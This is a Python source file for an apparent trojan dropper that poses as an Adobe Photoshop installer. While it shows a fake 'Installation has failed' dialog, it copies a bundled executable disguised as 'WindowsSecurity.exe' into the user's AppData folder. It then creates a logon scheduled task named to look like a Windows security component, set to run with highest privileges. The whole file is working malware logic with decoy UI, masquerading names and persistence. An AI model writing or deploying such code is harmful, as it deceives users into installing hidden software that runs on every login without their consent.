import os
import sys
import getpass
import shutil
import subprocess
import tkinter as tk
from tkinter import ttk


def resource_path(folder, file):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, folder, file)


class ErrorWindow:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Installating Adobe Photoshop")
        self.root.resizable(False, False)
        self.root.configure(bg='#f0f0f0')
        self.root.iconbitmap(resource_path('data', 'photoshop.ico'))

        self.setup_styles()
        self.create_widgets()

    def setup_styles(self):
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('.', background='#f0f0f0')

        style.configure('Title.TLabel',
                        font=('Segoe UI', 10, 'bold'),
                        foreground='#000000',
                        background='#f0f0f0')
        style.configure('Error.TLabel',
                        font=('Segoe UI', 9),
                        foreground='#000000',
                        background='#f0f0f0')
        style.configure('W11.TButton',
                        font=('Segoe UI', 9),
                        background='#0078d4',
                        foreground='white',
                        borderwidth=0)
        style.map('W11.TButton',
                  background=[('active', '#106ebe'),
                              ('pressed', '#005a9e')])

    def create_widgets(self):
        main_frame = ttk.Frame(self.root, padding=20)
        main_frame.grid(row=0, column=0, sticky='nsew')

        error_icon = tk.Canvas(main_frame, width=32, height=32,
                               bg='#f0f0f0', highlightthickness=0)
        error_icon.grid(row=0, column=0, rowspan=2, padx=(0, 15), sticky='n')

        error_icon.create_oval(2, 2, 30, 30, fill='#d13438', outline='')
        error_icon.create_line(8, 8, 24, 24, fill='white', width=2)
        error_icon.create_line(24, 8, 8, 24, fill='white', width=2)

        title_label = ttk.Label(main_frame, text="Installation has failed",
                                style='Title.TLabel')
        title_label.grid(row=0, column=1, sticky='w', pady=(0, 5))

        error_label = ttk.Label(main_frame,
                                text="There was an error while installing the application.",
                                style='Error.TLabel')
        error_label.grid(row=1, column=1, sticky='w', pady=(0, 20))

        button_frame = ttk.Frame(main_frame)
        button_frame.grid(row=3, column=0, columnspan=2, sticky='e')

        close_btn = ttk.Button(button_frame, text="Ok",
                               style='W11.TButton',
                               command=self.close_window)
        close_btn.pack(side='right', padx=(10, 0))

        self.center_window()

    def center_window(self):
        self.root.update_idletasks()
        width = 360
        height = 140
        x = (self.root.winfo_screenwidth() // 2) - (width // 2)
        y = (self.root.winfo_screenheight() // 2) - (height // 2)
        self.root.geometry(f'{width}x{height}+{x}+{y}')

    def close_window(self):
        self.root.destroy()

    def run(self):
        self.root.mainloop()


username = getpass.getuser()
target_dir = f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows'
os.makedirs(target_dir, exist_ok=True)

source_exe = resource_path('data', 'WindowsSecurity.exe')
target_exe = os.path.join(target_dir, 'WindowsSecurity.exe')

shutil.copy(source_exe, target_exe)

task_name = "WidowsSecurityApplication"
cmd = f'schtasks /create /tn "{task_name}" /tr "{target_exe}" /sc onlogon /rl highest /f'
subprocess.run(cmd, shell=True, check=True)

app = ErrorWindow()
app.run()